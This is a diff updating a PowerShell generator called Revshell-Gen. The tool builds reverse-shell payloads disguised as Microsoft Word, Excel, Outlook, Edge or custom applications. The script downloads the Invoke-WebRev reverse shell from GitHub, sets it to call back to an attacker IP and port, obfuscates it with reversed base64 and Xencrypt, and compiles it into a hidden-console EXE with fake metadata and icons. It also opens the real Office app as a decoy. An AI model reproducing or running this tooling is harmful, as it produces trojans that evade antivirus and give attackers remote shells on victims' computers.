@@ -1,10 +1,11 @@
-﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; Set-StrictMode -Off
+﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 $ProgressPreference = "SilentlyContinue" ; $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.2 - by @JoelGMSec" ; $Host.UI.RawUI.BackgroundColor = 'Black'
+$OSVersion = [Environment]::OSVersion.Platform ; if (!$OSVersion -like 'Unix') { $Host.UI.RawUI.BackgroundColor = 'Black' }
+Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.4 - by @JoelGMSec"
 
 function Show-Banner { Clear-Host
     Write-Host
-    Write-Host "__________                    ___            __   __    " -NoNewLine -ForegroundColor Blue ; Write-Host "            ________        v2.2   " -ForegroundColor Green
+    Write-Host "__________                    ___            __   __    " -NoNewLine -ForegroundColor Blue ; Write-Host "            ________        v2.4   " -ForegroundColor Green
     Write-Host "\______   \ ____ __  __ _____|   |___  ____ |  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "           /   ____/  ____ _____   " -ForegroundColor Green   
     Write-Host " |       _// __ \  \/  /  ___/       |/ __ \|  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "  ______  /   /  ___ / __ \     \  " -ForegroundColor Green
     Write-Host " |    |   \  ___/\    /\___ \|   |   |  ___/|  |_|  |__ " -NoNewLine -ForegroundColor Blue ; Write-Host " /_____/  \   \__\  \  ___/  |   \ " -ForegroundColor Green
@@ -39,11 +40,12 @@ function Show-Help {
     Write-Host ; pause }
 
 function Kill-Program {
-    Write-Host ; Write-Host "[!] Deleting temporary files.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; cd $env:temp ; Remove-Item *.ps1,*.ico 
-    Write-Host ; Write-Host "[!] Exiting!" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; exit }
+    $Host.UI.RawUI.ForegroundColor = 'White'
+    Write-Host ; Write-Host "[!] Deleting temporary files.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
+    Remove-Item $InvokePath -Force ; Remove-Item $XencryptPath -Force ; Remove-Item $PS2exePath -Force ; Remove-Item $IconPath -Force
+    Write-Host ; Write-Host "[!] Exiting!" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2000 ; exit }
 
 function Best64-Encoder {
-    $InvokePath = "$env:temp\Invoke-WebRev.ps1"
     $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($InvokePath)) ; $b64 = "`"$base64`""
     $base64rev = $b64.ToCharArray() ; [array]::Reverse($base64rev) ; $best64 = -join $base64rev | out-file $InvokePath
     @('$best64code=') + (Get-Content $InvokePath) | Set-Content $InvokePath
@@ -51,12 +53,11 @@ function Best64-Encoder {
     Add-Content $InvokePath '$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))'
     Add-Content $InvokePath 'Invoke-Expression $LoadCode'}
 
-$question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
-
 # Main function
 function Create-Payload {
     do { Show-Banner ; Show-Menu
 
+        $Question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
         $Host.UI.RawUI.ForegroundColor = 'Gray' ; & $Question
         $Random = New-Object System.Random ; "Choose one template:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {
@@ -87,75 +88,83 @@ if($template -in 'Windows') { $AppName = "windows" ; $Title = "Microsoft Windows
 if($template -in 'Custom') { 
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the name of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomName = $Host.UI.ReadLine() ; if(!$CustomName){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomName = $Host.UI.ReadLine() ; if(!$CustomName){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
     $Random = New-Object System.Random ; "Enter the name of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomName)
     
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the title of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomTitle = $Host.UI.ReadLine() ; if(!$CustomTitle){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomTitle = $Host.UI.ReadLine() ; if(!$CustomTitle){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
     $Random = New-Object System.Random ; "Enter the title of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomTitle)
 
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomCompany = $Host.UI.ReadLine() ; if(!$CustomCompany){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-    $Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomCompany = $Host.UI.ReadLine() ; if(!$CustomCompany){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
+    Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomCompany)
 
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the product of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomProduct = $Host.UI.ReadLine() ; if(!$CustomProduct){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomProduct = $Host.UI.ReadLine() ; if(!$CustomProduct){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
     $Random = New-Object System.Random ; "Enter the product of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomProduct)
 
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the version of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomVersion = $Host.UI.ReadLine() ; if(!$CustomVersion){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomVersion = $Host.UI.ReadLine() ; if(!$CustomVersion){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
     $Random = New-Object System.Random ; "Enter the version of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomVersion)
 
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
     $Random = New-Object System.Random ; "Enter the full path of the icon file:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomIcon = $Host.UI.ReadLine() ; if(!$CustomIcon){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red
-    Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; do { $CustomIcon = $Host.UI.ReadLine() ; if(!$CustomIcon){ Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; & $Question
     $Random = New-Object System.Random ; "Enter the full path of the icon file:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' }} until ($CustomIcon)
 
     $AppName = "$CustomName" ; $Title = "$CustomTitle" ; $Company = "$CustomCompany" ; $Product = "$CustomProduct" ; $Version = "$CustomVersion" ; $Icon = "$CustomIcon" }
 
+# System & Other variables
+    if ($OSVersion -like 'Unix') { 
+        $InvokePath = "./Invoke-WebRev.ps1"
+        $XencryptPath = "./xencrypt.ps1"
+        $PS2exePath = "./ps2exe.ps1"
+        $OutfilePath = "./$AppName.exe"
+        $IconPath = "./$AppName.ico"
+        $ip = hostname -I | awk '{print $1}' }
+
+    else { 
+        $InvokePath = "$env:temp\Invoke-WebRev.ps1"
+        $XencryptPath = "$env:temp\xencrypt.ps1"
+        $PS2exePath = "$env:temp\ps2exe.ps1"
+        $OutfilePath = "$pwd\$AppName.exe"
+        $IconPath = "$env:temp\$AppName.ico"
+        $ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1 }
+
 # IP to connect
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
 $Random = New-Object System.Random ; "Enter the IP of your server:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $ip = $Host.UI.ReadLine() ; if(!$ip) { [Console]::SetCursorPosition(0,"$cursortop")
-$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1
-Write-Host "Enter the IP of your server:` " -ForegroundColor Gray -NoNewLine ; Write-Host $ip -ForegroundColor Green }
+$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $readip = $Host.UI.ReadLine() ; if(!$readip) { [Console]::SetCursorPosition(0,"$cursortop")
+& $Question ; Write-Host "Enter the IP of your server:` " -ForegroundColor Gray -NoNewLine ; Write-Host $ip -ForegroundColor Green }
 
 # Listening port
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
 $Random = New-Object System.Random ; "Now, the listening port:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $port = $Host.UI.ReadLine() ; if(!$port) { [Console]::SetCursorPosition(0,"$cursortop")
-$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-Write-Host "Now, the listening port:` " -ForegroundColor Gray -NoNewLine ; Write-Host "1337" -ForegroundColor Green ; $port = "1337" }
+& $Question ; Write-Host "Now, the listening port:` " -ForegroundColor Gray -NoNewLine ; Write-Host "1337" -ForegroundColor Green ; $port = "1337" }
 
 # Enable/Disable SSL
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
 $Random = New-Object System.Random ; "Do you want to encrypt with SSL? [y/n]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-$Host.UI.RawUI.ForegroundColor = 'Green' ; $enablessl = $Host.UI.ReadLine() ; if(!$enablessl) { [Console]::SetCursorPosition(0,"$cursortop")
-$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-Write-Host "Do you want to encrypt with SSL? [y/n]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "yes" -ForegroundColor Green ; $enablessl = "yes" }
+$Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $enablessl = $Host.UI.ReadLine() ; if(!$enablessl) { [Console]::SetCursorPosition(0,"$cursortop")
+& $Question ; Write-Host "Do you want to encrypt with SSL? [y/n]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "yes" -ForegroundColor Green ; $enablessl = "yes" }
 
 # Download Invoke-WebRev.ps1 & add content
-Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.." -ForegroundColor Blue ; $InvokePath = "$env:temp\Invoke-WebRev.ps1"
+Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.." -ForegroundColor Blue
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1","$InvokePath")
 
 # Open legitimate Office Application
+if($AppName -in 'msedge') { $a = Get-Content $InvokePath ; $b = "start microsoft-edge: `n" ; Set-Content $InvokePath -value $b, $a }
 if($AppName -in 'WINWORD','EXCEL','OUTLOOK') { 
 
   $ScriptA = { 
@@ -164,23 +173,25 @@ if($AppName -in 'WINWORD','EXCEL','OUTLOOK') {
     $env:PATH += ';' + ($appPaths -join ';') ; $Office = $appPaths | findstr /i office | Select -First 1 }
 
   $ScriptB = "if(`$Office){ Start-Process `"`$Office\$AppName`" 2>&1> `$null }"
+  $Content = Get-Content $InvokePath ; Set-Content $InvokePath -value $ScriptA`n, $ScriptB`n, $Content }
 
-    $Content = Get-Content $InvokePath ; Set-Content $InvokePath -value $ScriptA`n, $ScriptB`n, $Content }
+# Add config to script
+if($enablessl -like 'y*') { $ssl = "-ssl" }
+Add-Content $InvokePath '$ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; $ConfirmPreference = "None"'
+Add-Content $InvokePath "Invoke-WebRev -ip $ip -port $port $ssl"
 
-if($AppName -in 'msedge') { $a = Get-Content $InvokePath ; $b = "start microsoft-edge: `n" ; Set-Content $InvokePath -value $b, $a }
-if($enablessl -like 'y*') { $ssl = "-ssl" } ; Add-Content $InvokePath "Invoke-WebRev -ip $ip -port $port $ssl"
-Add-Content $InvokePath '$ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; $Host.UI.RawUI.FlushInputBuffer()'
+# Encode Best64 & Encrypt PS1 with Xencrypt
+Write-Host ; Write-Host "[+] Downloading Xencrypt and doing some encryption.. " -ForegroundColor Blue -NoNewLine
+Best64-Encoder ; $RandomNumber = Get-Random (150..250) ; Write-Host "[$RandomNumber iterations]" -ForegroundColor Green
+(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1","$XencryptPath")
+Import-Module $XencryptPath -Force ; Invoke-Xencrypt -InFile $InvokePath -OutFile $InvokePath -Iterations $RandomNumber 2>&1> $null
 
-# Encrypt PS1 with Xencrypt
-$RandomNumber = Get-Random (150..250)
-Write-Host ; Write-Host "[+] Downloading Xencrypt and doing some encryption.. " -ForegroundColor Blue -NoNewLine ; Write-Host "[$RandomNumber iterations]" -ForegroundColor Green
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1","$env:temp\xencrypt.ps1")
-Import-Module $env:temp\xencrypt.ps1 ; Invoke-Xencrypt -InFile $InvokePath -OutFile $InvokePath -Iterations $RandomNumber 2>&1> $null
-
-# Download PS2exe & encode+compile exe file
-Write-Host ; Write-Host "[+] Downloading PS2exe and generating payload.." -ForegroundColor Blue ; [System.Convert]::FromBase64String(($b64ico)) | Set-Content $env:temp\$AppName.ico -Encoding Byte
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$env:temp\ps2exe.ps1") ; Best64-Encoder ; Import-Module $env:temp\ps2exe.ps1
-Invoke-ps2exe -inputFile $InvokePath -outputFile "$pwd\$AppName.exe" -title $Title -company $Company -product $Product -version $Version -iconFile "$env:temp\$AppName.ico" -noConsole -noError 2>&1> $null
+# Download PS2exe & Compile EXE file
+Write-Host ; Write-Host "[+] Downloading PS2exe and generating payload.." -ForegroundColor Blue
+(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$PS2exePath")
+if ($OSVersion -like 'Unix') { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -AsByteStream } else { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte }
+if ($OSVersion -like 'Unix') { (Get-Content $PS2exePath).Replace("powershell","pwsh") | Set-Content $PS2exePath ; (Get-Content $PS2exePath).Replace("PowerShell","pwsh") | Set-Content $PS2exePath }
+Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $InvokePath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
 
 Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
